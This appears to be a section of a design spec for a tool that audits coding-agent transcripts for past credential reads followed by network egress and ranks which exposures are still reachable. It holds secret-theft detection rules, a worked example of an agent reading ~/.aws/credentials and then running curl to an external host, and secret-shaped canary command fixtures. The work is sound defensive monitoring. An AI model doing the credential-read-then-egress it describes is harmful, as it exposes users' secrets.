`SessionKey` = `FileStem` (Claude/Factory) | `DirParent` (opencode, Copilot) | `RolloutFilename` (Codex) | `InLine(keys)` (Cursor `conversation_id`, Antigravity `conversationId`) | `SingleFile` (Aider repo-root = one logical session). One JSONL file == one `SessionTrace` for the file-bounded agents. Cursor/VS Code may interleave conversations into multiple traces; an event missing `conversation_id` attaches to the last-seen session in the file, else a synthetic id derived from the file stem — **never dropped silently**. `started_at` (frozen RFC3339, optional) = file-mtime floor or first-line timestamp; never fabricated; `None` when unknown.

#### 24.2.6 Incremental, bounded, rotation-aware scanning

MVP default is **ephemeral** (re-parse each run, no persisted cache — aligns with §22 "persisted session history not required"). Discovery is read-only and respects `crate::context::ScanLimits` (verified: `max_history_bytes_per_file` 50 MiB, `follow_symlinks=false`, `cross_filesystems=false`). Files over the byte cap are streamed line-by-line and marked `Truncated`. Discovery is **unbounded** — `max_age_secs = None`, so every transcript on disk across all time is read; there is no recency window or `--since` flag. Discovery is fully stateless/read-only (re-parse each run; no persisted cursor).

---

### 24.3 The retro-hazard join (`src/session/retro.rs`)

The retro engine does **not** re-implement the join. It reuses unchanged: `trace.rs` (frozen input), `normalize.rs` (Layer-1 + the §24.8a path/url gate), `classify.rs` (`Signal → FindingClass`), and `toxic_combinations.rs` (the same six rules — **no new rules, no new probe surface**). The baseline = one live `scan`'s `findings[]` (§14 JSON), the single shared denominator across every session. New logic is only: run the §23 classifier N times against the same baseline, re-resolve each combination's finding legs against the **current** findings to decide whether the hazard is *still live*, and rank by current reachability + recency.

#### 24.3.1 The retro gate

A session is kept as a hazard **iff at least one activated `finding_ref` still fires in today's baseline at severity ≥ `Notable`**. The join key is the §23.2 `Activates` edge (path/host/command-shape overlap against the finding's redacted evidence) — no new matching logic.

**Join-tightening (anti-false-positive):** a directory-prefix-only / listing / recursive-search overlap (`ls ~/.aws/`, `grep -r x ~`) may **not** contribute a `read`-class verb, headline, or `exit_in_session` cred-leg. The activating event's target must resolve to the **concrete secret artifact** the finding names. Directory-prefix joins are dropped from the realized set (summarized as a low-signal "enumerated near" footnote, never "read").

**Secret-bearing member only:** the `read_secret` signal fires only on the secret-bearing family member (`~/.aws/credentials` not `~/.aws/config`; `id_rsa` not `id_rsa.pub`). Misclassification can therefore only under-report, never inflate.

#### 24.3.2 Data model (all fields value-free)

```rust
pub struct HistoricalHazard {
    pub hazard_id: String,        // sha256(session_id ":" combo.name ":" sorted(event_ixs) ":" sorted(finding_refs))[..16]
    pub combination: ToxicCombination,   // REUSED §23.8 { name, severity, evidence[] }
    pub session: SessionDigest,
    pub reachability: ReachabilityVerdict,
    pub recency: RecencyVerdict,
    pub status: HazardStatus,
    pub exit_in_session: bool,           // did the activating session also egress/exit? gates the path/exfil headline clause (§24.4)
    pub ordering: Option<LegOrdering>,   // value-free confidence signal, NOT a gate (§24.6)
    pub realized_score: u8,              // 0..=100 ranking key
    pub summary: String,                 // templated, value-free, claim-bounded
    pub recommended_actions: Vec<String>,
}
pub struct SessionDigest { pub session_id: String, pub agent: String, pub repo: Option<String>,
    pub source_kind: SourceKind, pub source_label: String,    // shortened glob LABEL, never a raw $HOME path
    pub started_at: Option<String>, pub event_at: Option<String>, pub event_count: usize, pub time_source: TsBasis }
pub struct ReachabilityVerdict { pub legs: Vec<LegStatus>, pub still_reachable_count: usize,
    pub remediated_count: usize, pub all_required_present: bool }
pub struct LegStatus { pub finding_ref: FindingId, pub required: bool,
    pub current: Option<CurrentFinding>, pub durable: bool }      // durable = FindingScope::is_ambient_relevant()
pub struct CurrentFinding { pub severity: Severity, pub scope: FindingScope, pub confidence: Confidence }
pub struct RecencyVerdict { pub age_days: f64, pub decay: f64, pub ts_basis: TsBasis }
pub enum TsBasis { EventTimestamp, FileMtime }   // mtime = lower-confidence upper bound (copy/restore rewrites it)
pub enum LegOrdering { SecretReadPrecedesEgress, EgressPrecedesSecretRead, Unordered }
pub enum HazardStatus { StillReachable, PartiallyRemediated, RemediatedSince, ReviewGap }
```

`ToxicCombination`, `RiskLevel`, `Severity`, `Confidence`, `FindingScope`, `FindingId` are imported unchanged from §23 / `src/finding.rs` / `src/severity.rs` — no parallel types.

#### 24.3.3 Algorithm

```
retro_scan(baseline, traces, now):
  index = baseline.group_by(id)            // dup ids collapse to highest severity
  for trace in traces:
    normalized = normalize(trace.events)   // §23.4 Layer-1 + §24.8a path/url gate
    combos     = evaluate_toxic_rules(normalized, baseline)
    for combo in combos:
      rule     = rule_for(combo.name)              // static catalog lookup
      legpairs = walk_trigger(rule.finding_triggers())   // FindingTrigger → (finding_ref, required)
      legs     = legpairs.map(|(fid,req)| LegStatus{ fid, req,
                    current: index.get(fid).map(...), durable: scope.is_ambient_relevant() })
      verdict  = ReachabilityVerdict::from(legs)
      status   = classify_status(rule, verdict)
      (age,ts) = age_of_earliest_activating_event(trace, combo, now)
      recency  = RecencyVerdict{ age, decay(age), ts }
      ordering = leg_ordering(trace, combo)         // signal only
      score    = realized_score(rule, combo.severity, verdict, recency, status)
      route StillReachable/Partial/Remediated → hazards[], ReviewGap → review_gaps[]
  hazards.sort_by(realized_score desc, severity desc, still_reachable_count desc, event_at desc)
  recurrences = group_by(name).filter(count>=2)
```

`walk_trigger` required-ness: `All[ids]` → all required; `AnyOf[ids]` → satisfied if any present, each required **only when it is the sole present member** (so a session that read `aws.credentials.profiles` but only `env.secret_names` is reachable now still counts as a credential leg); `AllOf` → recurse; `None` → review-control-gap (no legs).

`classify_status`: `None`-trigger rule → **ReviewGap** (never asserts reachability — fixes the bug where vacuous "all required present" would mislabel it `PartiallyRemediated`); else all required legs present and ≥1 `Exposed` → `StillReachable`; all required present but ≤ `Notable` → `PartiallyRemediated`; any required leg absent/Info → `RemediatedSince` (`realized_score × ARCHIVAL_FLOOR=0.10`, sorts below every live hazard, rendered in an "Already remediated (historical)" ledger).

§23.8 must freeze two minimal accessors: `ToxicCombinationRule::finding_triggers(&self) -> &FindingTrigger` and `rule_for(name) -> Option<&'static ToxicCombinationRule>`. Retro does **not** invent a `combination.finding_refs()` on the output type.

#### 24.3.4 Recency & ranking

```
decay(age_days) = max(0.5 ^ (age_days / HALF_LIFE_DAYS=14), RECENCY_FLOOR=0.25)   // --retro-half-life
age_days from earliest event feeding an activated leg (ts_basis=EventTimestamp), else file mtime (FileMtime).
Future-dated/unparseable timestamps clamp age_days=0 (fail-loud-safe).

combo_base   = Critical→40 | High→25 | Medium→15            // §23.6 path weights
reach_factor = 1.00 StillReachable+all Exposed | 0.70 mixed | 0.45 PartiallyRemediated | 0.10 RemediatedSince
durability   = 1.0 + 0.15 * fraction(present legs whose scope.is_ambient_relevant())
realized_score = clamp(round(combo_base × reach_factor × durability × decay × 2.5), 0, 100)

ReviewGap (no legs): review_score = clamp(round(combo_base × decay × 1.5), 0, 60)   // separate lane, capped 60
```

Sort: `realized_score` desc → severity desc → `still_reachable_count` desc → `event_at` desc. Every multiplier is rendered with its driving `finding_ref`s (§13 anti-mystery-score). The constants (`×2.5`, the `1.00/0.70/0.45/0.10` ladder, the review path, half-life/floor) are **not literally in the brief** — freeze with fixtures and confirm with P1 before locking the ranking contract (the §23.18 analogue).

#### 24.3.5 Headline case (real ids)

```
session X (~/.claude/projects/<repo>/3f2a…e1.jsonl, 3 days ago)
  file_read   ~/.aws/credentials
  shell_command  curl https://<external>      (host → "[custom egress target]")
  §23.8 rule: exfiltration_path (critical); legs: egress.connectivity (required) + AnyOf[aws.credentials.profiles,…]
re-resolve vs CURRENT baseline:
  aws.credentials.profiles → Exposed, Ambient (durable) ✓
  egress.connectivity      → Exposed, Network (durable) ✓
⇒ StillReachable, realized_score ~96, ordering=secret_read_precedes_egress
  "3 days ago session X read an AWS credential store, then ran an external-egress command.
   Both findings (aws.credentials.profiles Exposed, egress.connectivity) are STILL reachable."
```
Counter-case: if `aws.credentials.profiles` is **absent** now (rotated since) → `RemediatedSince`, demoted to the ledger. *This asymmetry is the core product claim.*

#### 24.3.6 Toxic-combination reuse (no new rules)

| §23.8 rule | required-now legs | realized reading |
|---|---|---|
| `exfiltration_path` (crit) | `egress.connectivity` **and** AnyOf[`aws.credentials.profiles`,`env.secret_names`,`ssh.private_keys`,`git.credential_store`,`browser.session_stores`] | read a credential store then egressed; both still reachable |
| `production_deployment_path` (crit) | `git.push_likelihood` | edited `.github/workflows/*`; push still likely |
| `post_root_host_visibility` (crit) | AnyOf[`host.privilege_escalation`,`process.afunix_docker_sock`] **and** AnyOf[`cross_repo.sibling_repos`,`cross_repo.lateral_secrets`] | escalation + cross-repo reach still present |
| `source_control_mutation_path` (high) | `git.push_likelihood` | push reachability still armed (via readable key, token, or ssh-agent) |
| `saas_session_hijack` (high) | `browser.session_stores` **and** `egress.connectivity` | read a cookie store then egressed; both reachable |
| `high_review_risk` (high) | `None` | ReviewGap lane — **never** claims current reachability |

The reserved `persistence_path` rule inherits this machinery for free the day §23.8 promotes it; retro is rule-agnostic.

---

### 24.4 Privacy & containment (§4 — the harder constraint)

**Layer 0 (new), upstream of §23.4.** Because the secret exists *before* `AgentEvent`, the §23.4 normalizer is too late to be the first line. The slurp extractors are Layer-0: parse to the source's known shape, then **read only allowlisted keys** (tool name + whitelisted input keys); discard `text`/`thinking`/`tool_result`/prompt/`diff`-body/file-bytes by construction. The pipeline is `disk(hostile) → Layer-0 extractor (allowlist + argv reduction + path shorten) → AgentEvent → Layer-1 normalize.rs → classify/score → Layer-2 report::redaction::sweep → renderers`.

**Invariant (load-bearing):** *a raw secret value can exist only on the wire between disk and the Layer-0 extractor return.* The extractor returns the frozen `AgentEvent` enum with `diff`/`input`/`reason` emitted `None`.

**§24.8a — Layer-1 path/url shape gate (mandatory).** §23.4 sweeps only value-bearing free-text fields (`command`, `mcp_call.input`, `diff`, `reason`, `host`) and treats path/server/tool as inherently safe. That holds for structured JSONL (typed `tool_input.file_path`) but **fails for Markdown (Aider) and SQLite (`state.vscdb`)**, whose heuristic extraction could lift a secret-bearing line into `file_read.path`, `file_write.path`, or `mcp_call.server` — a value that bypasses Layer-1 and is caught by Layer-2 only if it matches a known token prefix (a generic password or non-pattern canary won't). This is the single highest-risk leak channel. So `normalize.rs` validates **every** `file_read.path`/`file_write.path`/`mcp_call.server`/`mcp_call.tool`: single line, ≤4096 bytes, no control chars, and run through `redaction::sweep`; a value that fails shape or trips a pattern becomes `[unparseable path]`/`[redacted target]` and downgrades the hazard's confidence. Credential URLs in `mcp_call.server` collapse to `[custom egress target]`. **No raw transcript byte reaches a path/server/tool field of any `HistoricalHazard`.**

**§24.8b — Canary self-test extended (mandatory).** The `self-test-redaction` harness (verified `self_test_redaction` exists in `src/lib.rs`, seeding `BLASTRADIUS_TEST_SECRET`/`OPENAI_API_KEY`) gains a synthetic-transcript stage, one fixture per parser shape, planting `br_test_SHOULD_NOT_LEAK` in **every discard and reduced-retain vector**: prompt text, `thinking`, `text`, `tool_result` (file bytes), `file_read.path`, `file_write.path`, `mcp_call.server`, `mcp_call.input` (None), `file_write.diff` (None), and a `shell_command` body containing an inline assignment (`export BR_CANARY=…` → `key+value_len`), a flag-with-value (`--password=…` → RHS redacted), a separated flag value (`-H …` → default-redact), a pattern-shaped `ghp_…` (Layer-2), **and a non-pattern, low-entropy paste `br_test_SHOULD_NOT_LEAK_RAW_PASTE`** (default operand redaction — the exact case an entropy gate would *fail*, and what proves the allowlist-by-default rule). Assertions: (1) serialize the parsed `SessionTrace`/`Vec<AgentEvent>` and assert the canary + `ghp_` shape are absent **before the engine** (proves Layer-0/§24.8a); (2) run through `audit-history`/`score` and assert absence from terminal/JSON/markdown/dashboard renderers, the `--hook` decision, and the `--ai` payload. A green canary on diff/command/host alone is **insufficient** and is itself a defect. Exit non-zero with a loud, value-free message on any leak.

**Reconciliation with §4.1–§4.6:** read-only (`open(O_RDONLY)`, never write/rename/delete a transcript; the only allowed writes are the requested report and the opt-in `--state` cursor, both `0600`/temp+rename/no-symlink-follow); no-secret-values output (ids, shortened labels, command shapes, `host:port`, classifications, counts, RFC3339 timestamps, session UUIDs); Layer-0+Layer-1+Layer-2 layering with the **same** `report::redaction::sweep`; no `--no-redact`/raw mode (raw inspection, if ever, is a compile-time feature); output local only; **no network I/O in slurp** (the only egress remains the §4.6 baseline-scan probes); `--ai` reads the value-free report only, behind `analyze::redaction_guard`, and is off by default.

**Opt-in + visible discovery.** Auto-discovery is **not default** — gated behind `--slurp`/`--retro`/the new verbs. A first-run banner names exactly which directories will be read *before* any read; a per-source summary (dirs scanned, files found incl. explicit `found: 0`) is emitted after, so an empty slurp is visibly empty, never mistaken for "no hazards." Divergent/unsupported sources (macOS IDE SQLite) are labeled `mocked`/`unsupported`, not silently skipped.

**Wording boundary (§5 — composes, never demonstrated).** The join keys on the *finding* still firing today, never on the historical secret value (which we never held and which may be rotated). Output asserts only that "an ambient capability a past session exercised is STILL reachable." Phrasings like "creds were exfiltrated"/"the agent exfiltrated" are **prohibited**; the path/exfil clause and any "Realized … path" token render **only when `exit_in_session==true` OR a toxic combination actually activated** — a lone realized cred-read renders a non-path headline. The `ordering` signal (read-precedes-egress) is rendered as confidence, never a causal claim; co-occurrence within a session is asserted, causality is not. The retro layer never claims a finding was reachable *at session time* (blastradius did not run then).

---

### 24.5 CLI surface

bare `blastradius` ≡ `scan` is unchanged. The `Command` enum is `scan`/`compare`/`dashboard`/`sessions`/`audit-history`/`self-test-redaction`. Discovery is always unscoped (every agent, every repo, all of time) — there are no `--since`/`--agent`/`--repo` or scan-tuning flags.

- **`blastradius sessions`** (no flags) — read-only, value-free discovery preview (`SessionInventory`): one row per discovered session with per-kind event counts. Opens each file only far enough to count by kind; never scores, joins, or touches the network. This is the trust gesture the secret-bearing input demands.
- **`blastradius audit-history [--baseline FILE] [--fail-on-score N] [--quiet] [--json|--markdown|--report] [--output DIR]`** — the retro scan producing `HistoryAuditReport` (ranked `RealizedHazard`s + `by_finding[]` rollup + aggregate containment sim) over ALL discovered transcripts. With no `--baseline`, runs the `scan` battery **once** as the shared denominator. Every ranked hazard is shown (no min-level/top filtering). `--quiet` emits one value-free line per hazard for cron/CI.

**Exit codes (no new codes):** `0` success (incl. empty result — "no sessions"/"none still-reachable" both exit `0` with an explicit message) · `1` runtime error · `3` reserved (compare) · `4` `--fail-on-score` met (reuses `FAIL_ON_MET`). Invalid usage (bad `--since`/`--agent`/out-of-range `N`) must reach **code `2` via a clap `value_parser`** (clap exits 2 pre-`run()`) or an added `exit::USAGE=2` — a bare `Err` would wrongly collapse to `1` (verified: `run()` maps every `Err` to `RUNTIME_ERROR`).

**Required plumbing (verified gaps):**
- `src/util/time.rs` (today only `now_iso8601`/`iso8601_from_unix`) must add `parse_duration` (`Nd|Nh|Nm|Nw`) and `unix_from_iso8601` (the civil-from-days algorithm reversed) — both `--since` windowing and `recency_days` need epoch seconds; no date dependency is added.
- `command_line_from`'s `VALUE_FLAGS`/`COMMANDS` allowlists carry `sessions`, `audit-history`, `--baseline`, and `--fail-on-score`, so user-supplied paths render as `[value]`, not leaked into the report body.

> **Unresolved cross-slice CLI contradiction (open question).** One slice proposed folding discovery under `score --slurp`/`score --list-sessions`; the dedicated-CLI slice proposed top-level `sessions`/`audit-history`. This doc adopts the dedicated verbs as the primary, more fully-specced surface, but both `score` and these verbs are equally greenfield, so the maintainer must pick one and add it explicitly to the §11 verb table + §23.12 (do not introduce a verb implicitly).

**Cron/CI.** `audit-history --baseline scan.json --fail-on-score 75` is the CI gate (exit 4). For unattended cron, recommend a cached `--baseline` so a nightly job is not re-running the live scan (and its egress probes) every run. `--watch`/daemon mode is out of scope; cron is the supported continuous path.

---

### 24.6 Dashboard — Tab 4 "Session History / Hazards"

A retro section driven by injected `D.history = HistoryAuditReport`. `blastradius dashboard [--ai] [--model M] [--bind ADDR] [--port N] [--no-open]`. The retro-hazard scan **always runs** — opening the dashboard discovers every agent transcript on disk (all agents, all time) and renders that value-free report; there is no flag to scope or disable it. (If no transcripts are found, the report is empty and the page falls back to the labeled illustrative fixture.) The dashboard **renders, never scores or ranks** — the retro section reflects `HistoryAuditReport` exactly, no client-side recompute or re-sort.

Components (reuse the existing palette, no new hex): `HazardLedger` (ranked rows: rank, level pill, score meter, recency chip with an "approx" marker when `time_source=mtime`, agent chip, value-free headline, toxic-combo tag shown only when one activated); drill-down expanding `reasons[]` (shape-only) where each `finding_ref` chip links to the **same Tab-1 probe node** the live Tab-3 reasons link to (the join is auditable end-to-end; the dashboard mints no finding ids); `FindingHeatStrip` (`by_finding[]`); retro `ContainmentSimulator` (each §23.10 control shows `hazards_suppressed`, e.g. "`no_egress` → would have prevented 4 of 6"). `--ai` stays explain-only; the ledger renders byte-identically with or without it.

**Bind default (load-bearing):** the dashboard's default bind is `0.0.0.0` with **no auth** (verified `src/cli.rs`), always — there is no loopback default and **no per-mode override**. Because retro history is on by default, the page publishes *which still-reachable credentials an agent actually read* — a precise LAN targeting map — so on a non-loopback bind the no-auth stderr warning MUST be kept and extended to name realized-hazard exposure; `--bind 127.0.0.1` is the explicit loopback opt-in. `D.history` is value-free by construction and the whole `D` payload still passes the final `sweep()` before it is written to the socket.

---

### 24.7 Module layout (fits the existing tree)

```
src/session/                       # IMPLEMENTED subtree (§23/§24 engine; the §23 scaffolding landed first)
  trace.rs                         # §23.3 frozen contract: AgentEvent, SessionTrace (our OUTPUT type)
  normalize.rs                     # §23.4 Layer-1 value-free boundary + §24.8a path/url gate (re-applies argv reduction)
  classify.rs                      # §23.5 Signal → FindingClass join (Activates edge)
  toxic_combinations.rs            # §23.8 rules + frozen accessors finding_triggers()/rule_for()
  score.rs report.rs               # §23.6/§23.9 engine + SessionReport (reused verbatim by retro)
  retro.rs                         # HistoricalHazard, ReachabilityVerdict, retro_scan(), realized_score, walk_trigger, recency
  retro_report.rs / history.rs     # HistoryAuditReport assembly + render_history_{terminal,json,markdown}; Layer-2 swept
  discovery/
    mod.rs                         # DiscoveryConfig, discover_sessions() → Vec<SessionSource>, public API
    registry.rs                    # AGENTS: &[AgentSpec] data table (mirrors probes/registry.rs, probes/store.rs::STORES)
    locate.rs                      # Root resolution (XDG/macOS/$HOME/CurrentRepo via std::env), glob expansion
    cursor.rs                      # opt-in incremental scan state (offsets/inode ids), value-free persistence
    extract.rs                     # Layer-0 value-free AgentEvent extraction; allowlist argv reconstruction
    parse/                         # one extractor per line shape:
      jsonl_claude.rs jsonl_codex.rs jsonl_copilot.rs jsonl_cursor.rs jsonl_antigravity.rs
      json_gemini.rs json_dir.rs markdown_aider.rs sqlite_vscdb.rs   # sqlite feature-gated `session-sqlite`
src/util/time.rs                   # ADD parse_duration + unix_from_iso8601
src/lib.rs                         # ADD Command::{Sessions,AuditHistory}; extend command_line allowlists; route exit 2
src/cli.rs                         # Sessions (unit) + AuditHistoryArgs; dashboard always discovers history (no flag)
src/dashboard/{mod.rs,page.rs}     # ADD Tab 4, D.history injection (bind stays global 0.0.0.0; no per-mode override)
```

`locate.rs` reads `XDG_CONFIG_HOME`/`XDG_DATA_HOME`/`COPILOT_HOME`/`CURSOR_PROJECT_DIR` from `std::env` **directly** (verified: `EnvSnapshot::capture()` stores only key+value_len, no path getter); env paths are used transiently to resolve+glob and **never** persisted into any `SessionSource`/cursor/report. Discovery honors `ScanLimits`; the agent table is an explicit data list so the inventory of every directory opened stays auditable. No new heavy deps for the high-confidence majority (`serde_json` + `walkdir` already present); SQLite is feature-gated off.

---

### 24.8 Open questions & top risks

**Open questions (maintainer decisions).**

- CLI surface contradiction unresolved: dedicated `sessions`/`audit-history` verbs (adopted here as primary) vs folding under `score --slurp`/`score --list-sessions`. Both are greenfield (no `score` command exists yet); maintainer must pick one and add it explicitly to the §11 verb table and §23.12.
- Ranking constants are not in the brief and must be frozen with fixtures + P1 sign-off (the §23.18 path-weight analogue): combo_base 40/25/15, reach_factor ladder 1.00/0.70/0.45/0.10, durability 1.0+0.15*frac, recency half-life 14d / floor 0.25, the x2.5 normalizer. The §24.3.4 `realized_score` formula is the single source of truth; there is no separate same-session-exit bonus (when `exit_in_session` is true the §23.8 exfiltration_path +40 path-weight is already baked into `combo_base`, so the exit signal is reflected there, not added again).
- Discovery is unbounded (no recency window): every transcript on disk, across all time, is read. This maximizes completeness (an older-but-still-reachable cred exfil is never skipped) at the cost of more work on a months-deep tree.
- --state persisted cursor is new on-disk state; §22 lists persisted session history as not-required. It stores only offsets/inode-ids/path-hashes/session-UUIDs (no content) but the maintainer must approve adding any persisted file; default OFF.
- Dashboard bind: the default is the global `0.0.0.0` with no per-mode override (`--bind 127.0.0.1` restricts to loopback). Retro history always runs, so the extended no-auth warning (naming realized-hazard exposure on a non-loopback bind) is retained as the mitigation.
- --fail-on-score reuses exit 4; if a fleet must distinguish the retro gate from the ambient --fail-on and the session --fail-on-score gates, code 5 is the alternative — maintainer's call.
- Unverified globs (Cursor CLI ~/.cursor/projects/*/agent-transcripts, Copilot ~/.copilot/session-state, Gemini ~/.gemini/tmp, opencode storage layout) are runtime-probed and format-sniffed rather than asserted; they may be wrong/empty on some versions and need real-machine confirmation.
- opencode msg_*.json ordering falls back to mtime if ids are non-monotonic in some version — confirm id monotonicity across opencode releases.
- Claude cwd-encoding (<enc-cwd> = absolute cwd with / and . replaced by -) is lossy/non-reversible; repo is a shortened trailing-component label and may be ambiguous — acceptable since repo is a label never a join key, but confirm.
- SQLite state.vscdb schema (Cursor IDE / Windsurf) is undocumented and version-volatile; feature-gated off by default so IDE-agent coverage is partial and labeled — decide whether to invest in the session-sqlite parser or stay detect-only.
- Implicit live-scan cost: audit-history re-runs the full probe battery + egress probe once per invocation unless --baseline is cached; decide the recommended cron cadence / cached-baseline refresh interval.
- Aggregate containment sim recomputes every hazard's session under each of 6 controls (O(hazards x controls)); confirm capping it to the post-min-level ranked set, not every discovered session.

**Top risks (load-bearing — drop any and the feature leaks or misleads at scale).**

- Unswept PATH/SERVER channel = the single highest-risk secret leak: §23.4 Layer-1 sweeps only command/mcp_input/diff/reason/host and treats file_read.path/file_write.path/mcp_call.server/tool as inherently safe; Markdown (Aider) and SQLite (state.vscdb) heuristic parsers could lift a secret-bearing transcript line into a path/server field that bypasses Layer-1 and that Layer-2 catches only if it matches a known prefix. Mitigated ONLY by the mandatory §24.8a path/url shape gate + §24.8b canary planted in path/server channels; if either is dropped the feature leaks at machine scale.
- ShellCommand.command argv reduction regressing to a blacklist/entropy gate: any operand that is neither a recognized structural token nor high-entropy would survive verbatim (positional secrets like mysql -pSECRET, -H 'Authorization: Bearer X', echoed sk-/ghp- literals, the low-entropy canary br_test_SHOULD_NOT_LEAK_RAW_PASTE). Must stay allowlist-by-default with --flag=VALUE RHS-redaction; the canary stage-1 (serialized AgentEvent before the engine) is the hard gate that fails loudly if anyone reintroduces an entropy gate.
- ~~Overstating maturity / hidden dependency~~ **(RESOLVED 2026-06-13)**: the §23 scaffolding (`trace.rs`/`normalize.rs`/`classify.rs`/`toxic_combinations.rs` + the `finding_triggers()`/`rule_for()` accessors) landed and the §24 layer was built on top — `src/session/` and the `sessions`/`audit-history` commands now ship and are tested. The original sequencing risk no longer applies; remaining post-MVP items are listed in §24.0.
- False-positive over-claim: §23.8 rules assert co-occurrence within a session, not causation; a credential read at minute 1 and an unrelated curl at minute 40 still activate exfiltration_path. Current-reachability gating + recency + the RemediatedSince asymmetry + the directory-prefix join-tightening mitigate but do not eliminate it; the wording boundary (composes/still-reachable, never 'exfiltrated', path clause only when exit_in_session or a combo actually fired) is load-bearing and must be enforced in headline templating.
- Dashboard exposure: Tab 4 publishes which still-reachable credentials an agent actually read — a precise LAN targeting map — and the dashboard default bind is 0.0.0.0 with no auth, always. Mitigated by the extended no-auth warning on any non-loopback bind (and by `--bind 127.0.0.1` to restrict to loopback); without the warning this becomes a network-exposed targeting service.
- Silent-empty discovery read as safety: wrong/absent globs, macOS vs Linux IDE divergence, ctx.home None, or OTEL-only agents yield zero sessions; without the opt-in banner + per-source found:0 summary + 'agent configured but 0 transcripts parsed' diagnostics, an operator reads absence-of-evidence as evidence-of-absence.
- Codex rollout world-readable 0644 secret-bearing function_call/event_msg argument bodies require a DISTINCT value-free extractor (not the Claude block model); if jsonl_codex.rs is treated as a Claude reuse, those argument bodies leak.
- Inherited content surface in HistoryAuditReport: reasons[].evidence reused verbatim from §23 would carry the swept-but-retained ShellCommand.command, and redaction::sweep is known-shape regex only (psql "...password=...", mysql -p, bare HTTP-header tokens survive). history.rs must reduce evidence to shape-only (argv[0]+pattern-category+host:port+ids+counts) and the §24.9 non-shaped-secret canary must fail the build if a raw command body ever reaches a RealizedHazard.
- Feasibility gap: util::time has no duration parser and no iso8601->unix inverse (verified only now_iso8601/iso8601_from_unix); --since windowing and recency_days both need epoch seconds, and exit code 2 routing + command_line allowlist extension are real edits without which usage errors collapse to exit 1 and user-supplied paths leak into the report body.
